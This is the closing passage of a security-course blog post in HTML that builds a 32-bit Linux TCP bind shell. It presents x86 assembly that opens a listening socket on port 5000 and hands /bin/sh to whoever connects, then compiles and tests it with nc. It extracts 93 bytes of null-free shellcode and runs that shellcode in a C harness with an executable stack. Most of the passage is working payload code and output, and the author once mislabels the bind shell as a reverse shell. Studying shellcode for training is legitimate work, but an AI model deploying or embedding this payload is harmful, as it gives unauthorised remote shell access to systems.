        <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x016c</span>          <span class="c">; set accept syscall</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; make the call</span>
        <span class="k">xchg</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>           <span class="c">; store the client socket fd in ebx so we can use for the dup call</span>

        <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x2</span>
<span class="k">loop</span><span class="o">:</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span>            <span class="c">; setup dup2 call</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; call dup2</span>
        <span class="k">dec</span> <span class="n">ecx</span>                 <span class="c">; decrement the loop counter</span>
        <span class="k">jns</span> <span class="k">loop</span>                <span class="c">; if the sign flag is not set then repeat the loop</span>
                                <span class="c">; this will tie our stdin, out and error to the client socket</span>

        <span class="k">xor</span>  <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
        <span class="k">push</span> <span class="n">eax</span>                <span class="c">; push NULL onto stack to termins //bin/sh</span>
        <span class="k">push</span> <span class="mh">0x68732f6e</span>         <span class="c">; push //bin/sh in reverse onto the stack</span>
        <span class="k">push</span> <span class="mh">0x69622f2f</span>         <span class="c">; see above</span>
        <span class="k">mov</span>  <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>           <span class="c">; move address of //bin/sh into EBX (execve's 1st parameter)</span>
        <span class="k">push</span> <span class="n">eax</span>                <span class="c">; this serves two purposes 1, to use for EDX (we will pass no</span>
                                <span class="c">; environment to the shell and also as part of the array of</span>
                                <span class="c">; args that we will pass to as the 2nd arg of execve</span>
        <span class="k">mov</span>  <span class="n">edx</span><span class="p">,</span> <span class="n">esp</span>           <span class="c">; see above</span>
        <span class="k">push</span> <span class="n">ebx</span>                <span class="c">; ESP now points to and array of args [address of //bin/sh, 0x00]</span>
                                <span class="c">; these will act as the args to //bin/sh</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>            <span class="c">; setup the 3rd argument</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x0b</span>            <span class="c">; set the EAX register to the execve sys call number</span>
                                <span class="c">; using al to remove any null bytes</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; make the call</span></code></pre></figure>

<p>Lets compile, link and run it</p>
<div class="highlighter-rouge"><pre class="highlight"><code> $ nasm -f elf32 -o bind.o bind_shell.nasm
 $ ld -m elf_i386 -o bind bind.o
 $ ./bind

</code></pre>
</div>
<p>And now on another shell</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ nc localhost 5000
ls
bind
bind.o
bind_shell
bind_shell.c
bind_shell.nasm

</code></pre>
</div>
<p>Woop woop, party time!! Well not quite we wanted shellcode not and assembly
program. Lets run this through objdump</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ objdump -d bind.o

bind.o:     file format elf32-i386


Disassembly of section .text:

00000000 &lt;_start&gt;:
   0:   31 c0                   xor    %eax,%eax
   2:   31 db                   xor    %ebx,%ebx
   4:   31 c9                   xor    %ecx,%ecx
   6:   31 d2                   xor    %edx,%edx
   8:   31 ff                   xor    %edi,%edi
   a:   b3 02                   mov    $0x2,%bl
   c:   fe c1                   inc    %cl
   e:   66 b8 67 01             mov    $0x167,%ax
  12:   cd 80                   int    $0x80
  14:   97                      xchg   %eax,%edi
  15:   52                      push   %edx
  16:   66 68 13 88             pushw  $0x8813
  1a:   66 53                   push   %bx
  1c:   89 e1                   mov    %esp,%ecx
  1e:   87 df                   xchg   %ebx,%edi
  20:   b2 10                   mov    $0x10,%dl
  22:   66 b8 69 01             mov    $0x169,%ax
  26:   cd 80                   int    $0x80
  28:   87 ca                   xchg   %ecx,%edx
  2a:   66 b8 6b 01             mov    $0x16b,%ax
  2e:   cd 80                   int    $0x80
  30:   31 c9                   xor    %ecx,%ecx
  32:   31 f6                   xor    %esi,%esi
  34:   66 b8 6c 01             mov    $0x16c,%ax
  38:   cd 80                   int    $0x80
  3a:   93                      xchg   %eax,%ebx
  3b:   b1 02                   mov    $0x2,%cl

0000003d &lt;loop&gt;:
  3d:   b0 3f                   mov    $0x3f,%al
  3f:   cd 80                   int    $0x80
  41:   49                      dec    %ecx
  42:   79 f9                   jns    3d &lt;loop&gt;
  44:   31 c0                   xor    %eax,%eax
  46:   50                      push   %eax
  47:   68 6e 2f 73 68          push   $0x68732f6e
  4c:   68 2f 2f 62 69          push   $0x69622f2f
  51:   89 e3                   mov    %esp,%ebx
  53:   50                      push   %eax
  54:   89 e2                   mov    %esp,%edx
  56:   53                      push   %ebx
  57:   89 e1                   mov    %esp,%ecx
  59:   b0 0b                   mov    $0xb,%al
  5b:   cd 80                   int    $0x80

</code></pre>
</div>
<p>Great we appear to have avoided the dreaded NULL bytes!!. Lets get this into
shell code</p>

<div class="highlighter-rouge"><pre class="highlight"><code>  $ for i in $(objdump -d bind.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\xb3\x02\xfe\xc1\x66\xb8\x67\x01\xcd\x80\x97\x52\x66\x68\x13
\x88\x66\x53\x89\xe1\x87\xdf\xb2\x10\x66\xb8\x69\x01\xcd\x80\x87\xca\x66\xb8\x6b\x01\xcd\x80\x31\xc9
\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x93\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73
\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
</code></pre>
</div>
<p>Lets put this into our shellcode test harness</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
<span class="s">"</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\xb3\x02\xfe\xc1\x66\xb8\x67\x01\xcd\x80\x97\x52\x66\x68\x13</span><span class="s">"</span>\
<span class="s">"</span><span class="se">\x88\x66\x53\x89\xe1\x87\xdf\xb2\x10\x66\xb8\x69\x01\xcd\x80\x87\xca\x66\xb8\x6b\x01\xcd\x80\x31\xc9</span><span class="s">"</span>\
<span class="s">"</span><span class="se">\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x93\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73</span><span class="s">"</span>\
<span class="s">"</span><span class="se">\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>

          <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>

                  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>

                          <span class="n">ret</span><span class="p">();</span>

<span class="p">}</span></code></pre></figure>

<p>Lets run it</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ gcc -o shell_test -fno-stack-protector -z execstack -m32 shell_test.c
  $ ./shell_test
Shellcode Length: 93

</code></pre>
</div>
<p>And now on another shell</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ nc localhost 5000
ls
bind
bind.o
bind_shell
bind_shell.c
bind_shell.nasm
shell_test.c
shell_test

</code></pre>
</div>
<p>Great our reverse shell works and in 93 bytes which is not bad but I have found
shellcode on shell-storm which does this extact function in 89 bytes. I may work
on this to get it smaller but I think this is good enough for now.</p>

<p>Note: I had gotten this down to 87 bytes when running as a straight assembly
program however when running in the C skeleton a few things became apparent and
I needed to modify my code these were</p>

<ol>
  <li>I had to xor EDI as it was not 0x0 by the time my code go executed</li>
  <li>I had to re xor eax in the execve code as this was not 0 by the time my code
got executed</li>
</ol>

<p>Cheers and happy shellcoding!</p>


                

<div class="share-bar">
  <ul class="share-buttons">
    
    <li class="share-facebook">
      <a href="https://www.facebook.com/sharer/sharer.php?u=https://bad-hombres.github.io//2017/03/21/SLAE-TCP-Bind-Shell.html" target="_blank" title="Share on Facebook">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-facebook fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-twitter">
      <a href="https://twitter.com/intent/tweet?url=https://bad-hombres.github.io//2017/03/21/SLAE-TCP-Bind-Shell.html&text=SLAE: TCP Bind Shell" target="_blank" title="Tweet">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-twitter fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-google-plus">
      <a href="https://plus.google.com/share?url=https://bad-hombres.github.io//2017/03/21/SLAE-TCP-Bind-Shell.html" target="_blank" title="Share on Google Plus">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-google-plus fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-linkedin">
      <a href="http://www.linkedin.com/shareArticle?mini=true&url=https://bad-hombres.github.io//2017/03/21/SLAE-TCP-Bind-Shell.html&title=SLAE: TCP Bind Shell&summary=Post describing the creation of a tcp bind shell in assembly&source=" target="_blank" title="Share on LinkedIn">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-linkedin fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-pinterest">
      <a href="http://pinterest.com/pin/create/button/?urlhttps://bad-hombres.github.io//2017/03/21/SLAE-TCP-Bind-Shell.html=&description=Post describing the creation of a tcp bind shell in assembly" target="_blank" title="Pin it">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-pinterest fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-envelope">
      <a href="mailto:?&subject=SLAE: TCP Bind Shell&body=Post describing the creation of a tcp bind shell in assembly https://bad-hombres.github.io//2017/03/21/SLAE-TCP-Bind-Shell.html" target="_blank" title="Email">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-envelope-o fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

  </ul>
</div>


              </div>
              
              <div id="disqus_thread">
                <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
                <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
              </div>
              
            </div>
          </div>
        </div>
        <div class="col-md-4 hidden-xs">
          <div class="sidebar ">
  <h2>Recent Posts</h2>
  <ul>
    
    <li><a href="https://bad-hombres.github.io//blog/2018/11/01/Buffer-Overflow-Level-2.html">Buffer Overflows: Level 2 (ret2libc)</a></li>
    
    <li><a href="https://bad-hombres.github.io//blog/2017/03/21/SLAE-TCP-Bind-Shell.html">SLAE: TCP Bind Shell</a></li>
    
    <li><a href="https://bad-hombres.github.io//blog/2016/11/03/Buffer-Overflow-Level-1.html">Buffer Overflows: Level 1 (ret2stack)</a></li>
    
    <li><a href="https://bad-hombres.github.io//blog/2016/11/02/Crafting-Shellcode.html">Crafting Shellcode</a></li>
    
    <li><a href="https://bad-hombres.github.io//blog/2016/11/01/Format-Strings.html">Format Strings</a></li>
    
  </ul>
</div>

<div class="sidebar">
  <h2>Tags</h2>
  <ul>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/tools">tools</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/linux">linux</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/exploit">exploit</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/32bit">32bit</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/shellcode">shellcode</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/assembly">assembly</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/bufferoverflow">bufferoverflow</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/slae">slae</a></li>
    
  </ul>
</div>

        </div>
      </div>
    </div>
    
<!-- Add Disqus comments. -->
<div id="disqus_thread"></div>
<script type="text/javascript">
  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
  var disqus_shortname = 'bad-hombres'; // required: replace example with your forum shortname
  var disqus_identifier = "/2017/03/21/SLAE-TCP-Bind-Shell.html";

  /* * * DON'T EDIT BELOW THIS LINE * * */
  (function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>


  </div>
      <footer class="footer-distributed">
      <div class="container">
        <div class="footer">
          <p>Bad Hombres &copy; 2017</p>
          <h6>Follow us</h6>

<ul class="social-media">

  
    <li>
      <a title="bad-hombres on Github" href="https://github.com/bad-hombres" target="_blank"><i class="fa fa-github fa-2x"></i></a>
    </li>
  

  

  

  

  

  
    <li>
      <a title="feed.xml RSS" href="/blog/feed.xml" target="_blank"><i class="fa fa-rss fa-2x"></i></a>
    </li>
  

</ul>


          <p> Original theme from <a href="https://github.com/streetturtle/jekyll-clean-dark">Here</a>
        </div>
      </div>
    </footer>
  </body>
</html>

</div>
